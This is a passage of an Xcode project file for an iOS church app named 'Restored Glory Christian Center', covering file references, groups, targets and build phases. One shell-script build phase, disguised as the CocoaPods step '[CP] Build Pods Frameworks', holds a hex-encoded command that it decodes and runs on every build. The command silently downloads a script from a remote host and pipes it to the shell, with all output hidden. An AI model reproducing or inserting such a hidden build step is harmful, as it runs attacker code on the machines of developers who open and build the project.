		18E9781725CE8522000D1F8D /* SideMenuVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuVC.swift; sourceTree = "<group>"; };
		18F49E6D25D407B600604C69 /* DetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailsVC.swift; sourceTree = "<group>"; };
		18F736572609AFC600C31214 /* AboutUSVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AboutUSVC.swift; sourceTree = "<group>"; };
		18F7365F2609D23700C31214 /* ContactUSVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactUSVC.swift; sourceTree = "<group>"; };
		18F736672609D7CB00C31214 /* AddEventVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddEventVC.swift; sourceTree = "<group>"; };
		1D6E1F6ECC36C25C63FAAED4 /* Pods_Restored_Glory_Christian_CenterTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Restored_Glory_Christian_CenterTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		27BA2699F42BF596E7600F40 /* Pods-Restored Glory Christian CenterTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian CenterTests.debug.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian CenterTests/Pods-Restored Glory Christian CenterTests.debug.xcconfig"; sourceTree = "<group>"; };
		40C4EA74E5E62CA3E4824A2B /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		4E193DCF2BB9B6F21C9A5E52 /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.release.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.release.xcconfig"; sourceTree = "<group>"; };
		76297625A537C9D5E8B0B7AB /* Pods_Restored_Glory_Christian_Center.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Restored_Glory_Christian_Center.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		9552839347FE18B41D6F2D69 /* Pods-Restored Glory Christian CenterTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian CenterTests.release.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian CenterTests/Pods-Restored Glory Christian CenterTests.release.xcconfig"; sourceTree = "<group>"; };
		A1368F0782F7E87F5D32EFD2 /* Pods-Restored Glory Christian Center.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center.debug.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center.debug.xcconfig"; sourceTree = "<group>"; };
		B3225C6F26579E28008FA3A7 /* TermUseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermUseVC.swift; sourceTree = "<group>"; };
		B3261246264D5BFB0057593B /* DetailsDataVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailsDataVC.swift; sourceTree = "<group>"; };
		B338D34026561E3B00804B42 /* PopUpListingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopUpListingVC.swift; sourceTree = "<group>"; };
		B339B7DF265E71B8009D09C7 /* tower.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = tower.gif; sourceTree = "<group>"; };
		B339DA28265CCD22008EE471 /* Gif file.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Gif file.swift"; sourceTree = "<group>"; };
		B339DA2D265D1B96008EE471 /* gif-file.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = "gif-file.gif"; sourceTree = "<group>"; };
		B3D6995C265503B20023F3C9 /* NotificationsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsVC.swift; sourceTree = "<group>"; };
		B3DF2D372654E01900A79D59 /* ListingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ListingVC.swift; sourceTree = "<group>"; };
		B3FB514D26537B9E004D45D3 /* HomeScreenVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeScreenVC.swift; sourceTree = "<group>"; };
		DDB68BD9D6441B8619644B6E /* Pods-Restored Glory Christian Center.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center.release.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center.release.xcconfig"; sourceTree = "<group>"; };
		DE339622DB02969CE64D330C /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		188C9A6725CE5BD2009AC9C8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				18399CA626313CB600FC55A5 /* WebKit.framework in Frameworks */,
				8CCFF29A63ECA0314F87267A /* Pods_Restored_Glory_Christian_Center.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		188C9A7D25CE5BD3009AC9C8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				58A4554EE0D39E337EAE6C02 /* Pods_Restored_Glory_Christian_CenterTests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		188C9A8825CE5BD3009AC9C8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F6F55311757424FCC979000A /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		18872CCC266B3A5C001509FF /* Cell */ = {
			isa = PBXGroup;
			children = (
				18872CCE266B3A7A001509FF /* HomeCell.swift */,
				18872CD6266B3AAE001509FF /* HomeCVCell.swift */,
				18872CDD266B3AC0001509FF /* HeaderView.xib */,
				18872CE2266B3ADB001509FF /* HeaderView.swift */,
				1860BC02266F2BC20034E63A /* UpcommingCellTableViewCell.swift */,
				1860BC03266F2BC20034E63A /* UpcommingCellTableViewCell.xib */,
				1860BC14266F30C30034E63A /* LiveStreamCell.swift */,
				1860BC15266F30C30034E63A /* LiveStreamCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		188C9A6125CE5BD2009AC9C8 = {
			isa = PBXGroup;
			children = (
				188C9A6C25CE5BD2009AC9C8 /* Restored Glory Christian Center */,
				188C9A8325CE5BD3009AC9C8 /* Restored Glory Christian CenterTests */,
				188C9A8E25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests */,
				188C9A6B25CE5BD2009AC9C8 /* Products */,
				D1877B19F328D806298CFA50 /* Pods */,
				2E84ABBC4A1BF364D134A978 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		188C9A6B25CE5BD2009AC9C8 /* Products */ = {
			isa = PBXGroup;
			children = (
				188C9A6A25CE5BD2009AC9C8 /* Restored Glory Christian Center.app */,
				188C9A8025CE5BD3009AC9C8 /* Restored Glory Christian CenterTests.xctest */,
				188C9A8B25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		188C9A6C25CE5BD2009AC9C8 /* Restored Glory Christian Center */ = {
			isa = PBXGroup;
			children = (
				18DD7BE925FA3A53002F7069 /* Restored Glory Christian Center.entitlements */,
				188C9AA025CE5C9D009AC9C8 /* App */,
				188C9AA125CE5CA3009AC9C8 /* Model */,
				188C9AA225CE5CAF009AC9C8 /* Controllers */,
				188C9AA325CE5CB7009AC9C8 /* Views */,
				188C9AA425CE5CBE009AC9C8 /* Resources */,
				188C9A7B25CE5BD3009AC9C8 /* Info.plist */,
			);
			path = "Restored Glory Christian Center";
			sourceTree = "<group>";
		};
		188C9A8325CE5BD3009AC9C8 /* Restored Glory Christian CenterTests */ = {
			isa = PBXGroup;
			children = (
				188C9A8425CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterTests.swift */,
				188C9A8625CE5BD3009AC9C8 /* Info.plist */,
			);
			path = "Restored Glory Christian CenterTests";
			sourceTree = "<group>";
		};
		188C9A8E25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests */ = {
			isa = PBXGroup;
			children = (
				188C9A8F25CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterUITests.swift */,
				188C9A9125CE5BD3009AC9C8 /* Info.plist */,
			);
			path = "Restored Glory Christian CenterUITests";
			sourceTree = "<group>";
		};
		188C9AA025CE5C9D009AC9C8 /* App */ = {
			isa = PBXGroup;
			children = (
				188C9AAC25CE5D67009AC9C8 /* Classes */,
				188C9AAD25CE5D6D009AC9C8 /* Managers */,
				188C9AAB25CE5D5E009AC9C8 /* Formatting */,
				188C9AAA25CE5D54009AC9C8 /* Constant */,
			);
			path = App;
			sourceTree = "<group>";
		};
		188C9AA125CE5CA3009AC9C8 /* Model */ = {
			isa = PBXGroup;
			children = (
			);
			path = Model;
			sourceTree = "<group>";
		};
		188C9AA225CE5CAF009AC9C8 /* Controllers */ = {
			isa = PBXGroup;
			children = (
				18872CCC266B3A5C001509FF /* Cell */,
				188C9AA825CE5D28009AC9C8 /* SideMEnu */,
				188C9AA725CE5CF3009AC9C8 /* Auth */,
			);
			path = Controllers;
			sourceTree = "<group>";
		};
		188C9AA325CE5CB7009AC9C8 /* Views */ = {
			isa = PBXGroup;
			children = (
				188C9A7325CE5BD2009AC9C8 /* Main.storyboard */,
				188C9AD425CE5E74009AC9C8 /* Auth.storyboard */,
				188C9A7825CE5BD3009AC9C8 /* LaunchScreen.storyboard */,
				18C4091F25F35504004786D9 /* Spalsh.storyboard */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		188C9AA425CE5CBE009AC9C8 /* Resources */ = {
			isa = PBXGroup;
			children = (
				188C9AA625CE5CE4009AC9C8 /* Font */,
				188C9AA525CE5CDC009AC9C8 /* Images */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		188C9AA525CE5CDC009AC9C8 /* Images */ = {
			isa = PBXGroup;
			children = (
				B339DA2D265D1B96008EE471 /* gif-file.gif */,
				B339B7DF265E71B8009D09C7 /* tower.gif */,
				188C9A7625CE5BD3009AC9C8 /* Assets.xcassets */,
			);
			path = Images;
			sourceTree = "<group>";
		};
		188C9AA625CE5CE4009AC9C8 /* Font */ = {
			isa = PBXGroup;
			children = (
				184E4CA325D108E000330A10 /* Roboto-Black.ttf */,
				184E4C9F25D108E000330A10 /* Roboto-BlackItalic.ttf */,
				184E4CA025D108E000330A10 /* Roboto-Bold.ttf */,
				184E4C9825D108DE00330A10 /* Roboto-BoldItalic.ttf */,
				184E4C9925D108DE00330A10 /* Roboto-Italic.ttf */,
				184E4CA425D108E100330A10 /* Roboto-Light.ttf */,
				184E4C9A25D108DE00330A10 /* Roboto-LightItalic.ttf */,
				184E4C9E25D108DF00330A10 /* Roboto-Medium.ttf */,
				184E4C9525D108DD00330A10 /* Roboto-MediumItalic.ttf */,
				184E4C9625D108DE00330A10 /* Roboto-Regular.ttf */,
				184E4C9725D108DE00330A10 /* Roboto-Thin.ttf */,
				184E4C9C25D108DF00330A10 /* Roboto-ThinItalic.ttf */,
				184E4CA225D108E000330A10 /* RobotoCondensed-Bold.ttf */,
				184E4CA525D108E100330A10 /* RobotoCondensed-BoldItalic.ttf */,
				184E4C9425D108DD00330A10 /* RobotoCondensed-Italic.ttf */,
				184E4C9B25D108DF00330A10 /* RobotoCondensed-Light.ttf */,
				184E4CA125D108E000330A10 /* RobotoCondensed-LightItalic.ttf */,
				184E4C9D25D108DF00330A10 /* RobotoCondensed-Regular.ttf */,
			);
			path = Font;
			sourceTree = "<group>";
		};
		188C9AA725CE5CF3009AC9C8 /* Auth */ = {
			isa = PBXGroup;
			children = (
				18C4092425F355BC004786D9 /* Splash */,
				18CBC05725CE74DB00264243 /* SignInVC.swift */,
				18CBC05C25CE74EA00264243 /* SignUpVC.swift */,
				18CBC06125CE750100264243 /* ForgotPasswordVC.swift */,
			);
			path = Auth;
			sourceTree = "<group>";
		};
		188C9AA825CE5D28009AC9C8 /* SideMEnu */ = {
			isa = PBXGroup;
			children = (
				18F3E87F266F9674008BADD1 /* Cell */,
				18C58DF425DD400F00EC5379 /* Admin */,
				188C9AA925CE5D3B009AC9C8 /* Profiles */,
				18E9780F25CE7E6C000D1F8D /* HomeVC.swift */,
				18872CC4266B3748001509FF /* NewHomeVC.swift */,
				18E9781725CE8522000D1F8D /* SideMenuVC.swift */,
				18E9780A25CE7DEF000D1F8D /* SideMenuController.swift */,
				18C5BD1B25D282A400F77E80 /* AnnouncementsVC.swift */,
				18C5BD2025D2830600F77E80 /* Men'sMinistryVC.swift */,
				18C5BD2525D2831B00F77E80 /* Women'sMinistryVC.swift */,
				18D936A425D3EE610013E166 /* ChoirRehearsal.swift */,
				18F49E6D25D407B600604C69 /* DetailsVC.swift */,
				189B361525D5673000ABAA31 /* ChangePasswordVC.swift */,
				18F736572609AFC600C31214 /* AboutUSVC.swift */,
				18F7365F2609D23700C31214 /* ContactUSVC.swift */,
				18C8B600263D275C00B7039C /* ShowDescriptioVC.swift */,
				B3D6995C265503B20023F3C9 /* NotificationsVC.swift */,
				B338D34026561E3B00804B42 /* PopUpListingVC.swift */,
				B3225C6F26579E28008FA3A7 /* TermUseVC.swift */,
			);
			path = SideMEnu;
			sourceTree = "<group>";
		};
		188C9AA925CE5D3B009AC9C8 /* Profiles */ = {
			isa = PBXGroup;
			children = (
				184E4CBB25D154E100330A10 /* ProfileVC.swift */,
				184E4CC025D154F900330A10 /* EditProfileVC.swift */,
				B3261246264D5BFB0057593B /* DetailsDataVC.swift */,
				B3FB514D26537B9E004D45D3 /* HomeScreenVC.swift */,
				B3DF2D372654E01900A79D59 /* ListingVC.swift */,
			);
			path = Profiles;
			sourceTree = "<group>";
		};
		188C9AAA25CE5D54009AC9C8 /* Constant */ = {
			isa = PBXGroup;
			children = (
				188C9ACB25CE5E3D009AC9C8 /* AFWrapperClass.swift */,
				188C9ACC25CE5E3D009AC9C8 /* Constant.swift */,
				188C9ACD25CE5E3D009AC9C8 /* Reachability.swift */,
				B339DA28265CCD22008EE471 /* Gif file.swift */,
			);
			path = Constant;
			sourceTree = "<group>";
		};
		188C9AAB25CE5D5E009AC9C8 /* Formatting */ = {
			isa = PBXGroup;
			children = (
				188C9AC325CE5E29009AC9C8 /* Activityloader.swift */,
				188C9AC425CE5E29009AC9C8 /* ChangeBottamColor.swift */,
				188C9AC225CE5E29009AC9C8 /* HelperMethods.swift */,
			);
			path = Formatting;
			sourceTree = "<group>";
		};
		188C9AAC25CE5D67009AC9C8 /* Classes */ = {
			isa = PBXGroup;
			children = (
				184B11AC25E371B1003007A2 /* AppDelegate.swift */,
				184B11AB25E371B0003007A2 /* AppExtensions.swift */,
				184B11A925E371B0003007A2 /* AppFunctions.swift */,
				184B11A825E371B0003007A2 /* ImagePicker.swift */,
				184B11AA25E371B0003007A2 /* SceneDelegate.swift */,
			);
			path = Classes;
			sourceTree = "<group>";
		};
		188C9AAD25CE5D6D009AC9C8 /* Managers */ = {
			isa = PBXGroup;
			children = (
				188C9ABA25CE5E1D009AC9C8 /* AppConstants.swift */,
				188C9ABB25CE5E1D009AC9C8 /* DisplayAlertManager.swift */,
				188C9AB925CE5E1D009AC9C8 /* ValidationManager.swift */,
			);
			path = Managers;
			sourceTree = "<group>";
		};
		18C4092425F355BC004786D9 /* Splash */ = {
			isa = PBXGroup;
			children = (
				18C4092525F355F0004786D9 /* SplashVC.swift */,
			);
			path = Splash;
			sourceTree = "<group>";
		};
		18C58DF425DD400F00EC5379 /* Admin */ = {
			isa = PBXGroup;
			children = (
				184E4CC525D1553200330A10 /* AdminVC.swift */,
				184E4CCA25D1555900330A10 /* PushMessageVC.swift */,
				18C5BD1625D26AA100F77E80 /* AddLinkVC.swift */,
				18C58DF525DD402900EC5379 /* ShowLinksVC.swift */,
				18F736672609D7CB00C31214 /* AddEventVC.swift */,
			);
			path = Admin;
			sourceTree = "<group>";
		};
		18F3E87F266F9674008BADD1 /* Cell */ = {
			isa = PBXGroup;
			children = (
			);
			path = Cell;
			sourceTree = "<group>";
		};
		2E84ABBC4A1BF364D134A978 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				18399CA526313CB600FC55A5 /* WebKit.framework */,
				76297625A537C9D5E8B0B7AB /* Pods_Restored_Glory_Christian_Center.framework */,
				40C4EA74E5E62CA3E4824A2B /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework */,
				1D6E1F6ECC36C25C63FAAED4 /* Pods_Restored_Glory_Christian_CenterTests.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		D1877B19F328D806298CFA50 /* Pods */ = {
			isa = PBXGroup;
			children = (
				A1368F0782F7E87F5D32EFD2 /* Pods-Restored Glory Christian Center.debug.xcconfig */,
				DDB68BD9D6441B8619644B6E /* Pods-Restored Glory Christian Center.release.xcconfig */,
				DE339622DB02969CE64D330C /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig */,
				4E193DCF2BB9B6F21C9A5E52 /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.release.xcconfig */,
				27BA2699F42BF596E7600F40 /* Pods-Restored Glory Christian CenterTests.debug.xcconfig */,
				9552839347FE18B41D6F2D69 /* Pods-Restored Glory Christian CenterTests.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		188C9A6925CE5BD2009AC9C8 /* Restored Glory Christian Center */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 188C9A9425CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian Center" */;
			buildPhases = (
				45D15482DA86EF6D856D902C /* [CP] Build Pods Frameworks */,
				EF3246B658E8D6BF0DA9A44E /* [CP] Check Pods Manifest.lock */,
				188C9A6625CE5BD2009AC9C8 /* Sources */,
				188C9A6725CE5BD2009AC9C8 /* Frameworks */,
				188C9A6825CE5BD2009AC9C8 /* Resources */,
				DEC1CC454B287698D24C15D0 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Restored Glory Christian Center";
			productName = "Restored Glory Christian Center";
			productReference = 188C9A6A25CE5BD2009AC9C8 /* Restored Glory Christian Center.app */;
			productType = "com.apple.product-type.application";
		};
		188C9A7F25CE5BD3009AC9C8 /* Restored Glory Christian CenterTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 188C9A9725CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian CenterTests" */;
			buildPhases = (
				81331D7EC4A274C6C10456D7 /* [CP] Check Pods Manifest.lock */,
				188C9A7C25CE5BD3009AC9C8 /* Sources */,
				188C9A7D25CE5BD3009AC9C8 /* Frameworks */,
				188C9A7E25CE5BD3009AC9C8 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				188C9A8225CE5BD3009AC9C8 /* PBXTargetDependency */,
			);
			name = "Restored Glory Christian CenterTests";
			productName = "Restored Glory Christian CenterTests";
			productReference = 188C9A8025CE5BD3009AC9C8 /* Restored Glory Christian CenterTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		188C9A8A25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 188C9A9A25CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian CenterUITests" */;
			buildPhases = (
				86A10F7219AC1C9D99542179 /* [CP] Check Pods Manifest.lock */,
				188C9A8725CE5BD3009AC9C8 /* Sources */,
				188C9A8825CE5BD3009AC9C8 /* Frameworks */,
				188C9A8925CE5BD3009AC9C8 /* Resources */,
				A8BB7E7FCE5555AC6C9313EA /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
				188C9A8D25CE5BD3009AC9C8 /* PBXTargetDependency */,
			);
			name = "Restored Glory Christian CenterUITests";
			productName = "Restored Glory Christian CenterUITests";
			productReference = 188C9A8B25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		188C9A6225CE5BD2009AC9C8 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1230;
				LastUpgradeCheck = 1230;
				TargetAttributes = {
					188C9A6925CE5BD2009AC9C8 = {
						CreatedOnToolsVersion = 12.3;
					};
					188C9A7F25CE5BD3009AC9C8 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 188C9A6925CE5BD2009AC9C8;
					};
					188C9A8A25CE5BD3009AC9C8 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 188C9A6925CE5BD2009AC9C8;
					};
				};
			};
			buildConfigurationList = 188C9A6525CE5BD2009AC9C8 /* Build configuration list for PBXProject "Restored Glory Christian Center" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 188C9A6125CE5BD2009AC9C8;
			productRefGroup = 188C9A6B25CE5BD2009AC9C8 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				188C9A6925CE5BD2009AC9C8 /* Restored Glory Christian Center */,
				188C9A7F25CE5BD3009AC9C8 /* Restored Glory Christian CenterTests */,
				188C9A8A25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		188C9A6825CE5BD2009AC9C8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				184E4CB425D108E100330A10 /* RobotoCondensed-Bold.ttf in Resources */,
				184E4CB325D108E100330A10 /* RobotoCondensed-LightItalic.ttf in Resources */,
				184E4CAA25D108E100330A10 /* Roboto-BoldItalic.ttf in Resources */,
				184E4CAC25D108E100330A10 /* Roboto-LightItalic.ttf in Resources */,
				184E4CAF25D108E100330A10 /* RobotoCondensed-Regular.ttf in Resources */,
				184E4CA925D108E100330A10 /* Roboto-Thin.ttf in Resources */,
				188C9AD525CE5E74009AC9C8 /* Auth.storyboard in Resources */,
				B339B7E0265E71B8009D09C7 /* tower.gif in Resources */,
				184E4CB525D108E100330A10 /* Roboto-Black.ttf in Resources */,
				184E4CB025D108E100330A10 /* Roboto-Medium.ttf in Resources */,
				184E4CB225D108E100330A10 /* Roboto-Bold.ttf in Resources */,
				184E4CA825D108E100330A10 /* Roboto-Regular.ttf in Resources */,
				184E4CB625D108E100330A10 /* Roboto-Light.ttf in Resources */,
				184E4CB125D108E100330A10 /* Roboto-BlackItalic.ttf in Resources */,
				188C9A7A25CE5BD3009AC9C8 /* LaunchScreen.storyboard in Resources */,
				188C9A7725CE5BD3009AC9C8 /* Assets.xcassets in Resources */,
				188C9A7525CE5BD2009AC9C8 /* Main.storyboard in Resources */,
				184E4CAB25D108E100330A10 /* Roboto-Italic.ttf in Resources */,
				184E4CA725D108E100330A10 /* Roboto-MediumItalic.ttf in Resources */,
				18C4092025F35504004786D9 /* Spalsh.storyboard in Resources */,
				B339DA2E265D1B96008EE471 /* gif-file.gif in Resources */,
				184E4CB725D108E100330A10 /* RobotoCondensed-BoldItalic.ttf in Resources */,
				184E4CAD25D108E100330A10 /* RobotoCondensed-Light.ttf in Resources */,
				18872CDE266B3AC0001509FF /* HeaderView.xib in Resources */,
				184E4CA625D108E100330A10 /* RobotoCondensed-Italic.ttf in Resources */,
				1860BC05266F2BC20034E63A /* UpcommingCellTableViewCell.xib in Resources */,
				184E4CAE25D108E100330A10 /* Roboto-ThinItalic.ttf in Resources */,
				1860BC17266F30C30034E63A /* LiveStreamCell.xib in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		188C9A7E25CE5BD3009AC9C8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		188C9A8925CE5BD3009AC9C8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		45D15482DA86EF6D856D902C /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
		};
		81331D7EC4A274C6C10456D7 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Restored Glory Christian CenterTests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		86A10F7219AC1C9D99542179 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		A8BB7E7FCE5555AC6C9313EA /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		DEC1CC454B287698D24C15D0 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
